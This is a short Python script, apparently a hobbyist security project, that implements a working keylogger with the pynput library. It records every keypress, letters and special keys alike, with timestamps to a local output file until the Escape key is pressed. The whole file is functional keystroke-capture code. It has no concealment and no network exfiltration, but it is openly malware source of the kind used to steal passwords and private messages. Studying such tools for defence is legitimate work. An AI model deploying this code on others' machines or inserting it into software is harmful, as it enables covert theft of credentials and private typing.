from pynput.keyboard import Key, Listener  # Import Key and Listeners

import logging

# Set up logging to output the keypresses to a file
logging.basicConfig(filename="D:\\Reeba\\My Projects\\cyber sec projects\\keylogger\\output.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

# Function to log key press events
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Function to stop the listener when Escape key is pressed
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

